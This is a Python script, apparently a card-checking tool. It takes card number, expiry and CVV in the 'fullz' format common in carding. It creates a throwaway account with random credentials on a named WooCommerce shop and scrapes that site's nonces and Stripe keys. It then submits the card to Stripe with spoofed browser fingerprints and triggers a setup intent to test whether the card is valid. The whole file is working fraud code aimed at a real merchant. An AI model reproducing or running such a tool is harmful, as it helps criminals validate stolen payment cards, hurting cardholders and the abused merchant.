import base64
import aiohttp
import random
import time
import json
import uuid
import asyncio
from fake_useragent import UserAgent
import requests
from defs import *
import re
from html import unescape

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "paraelsan" + str(random.randint(9999, 574545))
        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
        pwd = "Paraelsan" + str(random.randint(9999, 574545))

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        async with session.get('https://christianapostles.com/my-account/', headers=headers) as response:
            response_text = await response.text()

        register = gets(response_text, '"woocommerce-register-nonce" value="', '" />')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://christianapostles.com',
            'priority': 'u=0, i',
            'referer': 'https://christianapostles.com/my-account/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'username': user,
            'email': mail,
            'password': pwd,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://christianapostles.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2025-08-15 10:28:18',
            'wc_order_attribution_session_pages': '13',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        await session.post('https://christianapostles.com/my-account/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://christianapostles.com/my-account/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        await session.get('https://christianapostles.com/my-account/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://christianapostles.com/my-account/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        await session.get('https://christianapostles.com/my-account/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://christianapostles.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        async with session.get('https://christianapostles.com/my-account/add-payment-method/', headers=headers) as response:
            response_text = await response.text()

        pk = gets(response_text, '"publishableKey":"', '"')
        acc = gets(response_text, '"accountId":"', '"')
        nonce = gets(response_text, '"createSetupIntentNonce":"', '"')

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'billing_details[name]':' ',
            'billing_details[email]': mail,
            'billing_details[address][country]':'SG',
            'type':'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay':'unspecified',
            'payment_user_agent':'stripe.js/0f795842d4; stripe-js-v3/0f795842d4; payment-element; deferred-intent',
            'referrer':'https://christianapostles.com',
            'time_on_page':'103723',
            'client_attribution_metadata[client_session_id]':'600b6e8b-e9ff-49f4-9d5a-1f0bd64321b2',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
            'client_attribution_metadata[merchant_integration_version]':'2021',
            'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
            'client_attribution_metadata[payment_method_selection_flow]':'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]':'f52dd1e2-4421-46e7-a3af-5751353646a9',
            'guid':'6632a40c-d097-43ee-aa0b-d6781bfc4db3e3ebe1',
            'muid':'275bed79-f513-414d-ab6d-21597f16e1bc87b0e6',
            'sid':'a8187c2d-09fb-4bf2-ab20-3aa0c49b17c2c7062a',
            'key': pk,
            '_stripe_account': acc,
        }

        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as response:
            response_json = await response.json()

        try:
            id = response_json['id']
        except Exception:
            return str(response_json)

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarye7W44erveCXdazwi',
            'origin': 'https://christianapostles.com',
            'priority': 'u=1, i',
            'referer': 'https://christianapostles.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        form_data = aiohttp.FormData()
        form_data.add_field('action', 'create_setup_intent')
        form_data.add_field('wcpay-payment-method', id)
        form_data.add_field('_ajax_nonce', nonce)

        async with session.post('https://christianapostles.com/wp-admin/admin-ajax.php', headers=headers, data=form_data) as response:
            response_text = await response.text()

        return response_text

    except Exception as e:
        return str(e)
